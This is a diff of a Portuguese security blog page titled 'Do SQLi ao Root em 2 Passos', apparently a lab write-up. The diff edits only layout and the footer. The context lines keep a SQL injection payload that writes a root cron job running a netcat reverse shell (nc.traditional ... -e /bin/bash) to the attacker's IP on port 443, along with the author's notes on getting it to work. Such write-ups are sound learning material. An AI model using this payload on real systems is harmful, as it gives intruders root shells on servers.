@@ -71,6 +71,8 @@
     
   
     
+  
+    
       <span class="Navbar__Delim">&centerdot;</span>
       <a href="referencia-rapida.html">
         <div class="Navbar__Btn">
@@ -130,6 +132,8 @@
   
     
   
+    
+  
 </nav>
   <header class="Header">
     
@@ -140,7 +144,7 @@
     <div class="Header__Spacer ">
     </div>
     
-    <h1 class="Header__Title_post">Do SQLi ao Root em 2 Passos</h1>
+    <h1 class="Header__Title">Do SQLi ao Root em 2 Passos</h1>
     
       <div class="DateTagBar">
         
@@ -158,28 +162,13 @@
 <span class="token keyword">select</span> <span class="token string">"*/1 *   * * *"</span> <span class="token punctuation">,</span> <span class="token string">"root"</span> <span class="token punctuation">,</span> <span class="token string">"nc.traditional 192.168.200.3 443 -e /bin/bash"</span> 
 </span></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span></span></mark></strong></span><span class="SemanticString"><span> <span class="token string">'/etc/cron.d/crontab'</span><span class="token comment">--%20-</span></span></span></span></code></pre><div id="https://www.notion.so/45337523dbbb458a988dc38f831c5afd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/66248293e08f4bd5bccb5ae3c19dacc8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Tá, não foi assim de primeira , no alvo, prego batido de ponta virada né ? Primeiro apanhei para descobrir que essa danada dessa máquina só tem permissão para se conecta na porta 443 e 22. Depois apanhei tentando fazer com um telnet reverso mas o cron, pelo que entendi abre um subprocesso que morre logo em seguida não permitindo que o telnet fique no ar. Não cheguei a tentar com perl, php, python, etc., pois eu tava decidido a fazer com &quot;comandos do sistema&quot;. Ai no finalzim, vi que o danado tinha o nc.tradicional, ou seja, o nosso net gatinho tradicional.</em></span></span></p></div><div id="https://www.notion.so/983a70d680c94dfd9d3026c284b46cc0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/355bb56660744cd0977329126db659ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ai agora é injetar via Burp abrir um NC no terminal e aguardar o Shell cair no seu colo:</span></span></p></div><div id="https://www.notion.so/e9f8fde3038a4e5ca72fbc1cc988afdf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mandando bala</span></span></p></div><div id="https://www.notion.so/dcd102848cd74d328c15a59b8e98a9eb" class="Image Image--PageWidth"><figure><a href="#?width=668"><img src="#?width=668" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0627806a56374c9c8773c24df0a15802" class="Image Image--PageWidth"><figure><a href="#?width=700"><img src="#?width=700" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b96d29b7185e407690072c2c0c4cec9b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a9dd35c677e74d54a10d9fd798ea59cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recebendo o doce</span></span></p></div><div id="https://www.notion.so/dee3a871f5f347159cf2f78913781ff0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a7cc8dbc7d2845e98bb70f105aab89f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E tá ai , rapidinho, nada de restricted shell, nada de escalar privilégios, etc, etc, etc. Direto ao Shell. ;D</span></span></p></div></article>
   <footer class="Footer">
-<script src="https://giscus.app/client.js"
-        data-repo="diegoalbuquerque/offensivethinkcomments"
-        data-repo-id="R_kgDOJpiCVg"
-        data-category="General"
-        data-category-id="DIC_kwDOJpiCVs4CW4pD"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="bottom"
-        data-theme="dark"
-        data-lang="pt"
-        crossorigin="anonymous"
-        async>
-</script>
-<br/>
-  <div>&copy; www.offensivethink.com 2019-2021</div>
+  <div>&copy; www.offensivethink.com 2024</div>
   <div>&centerdot;</div>
   <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
       rel="noopener noreferrer">Notablog</a>.
   </div>
 </footer>
+
 </body>
 
 </html>
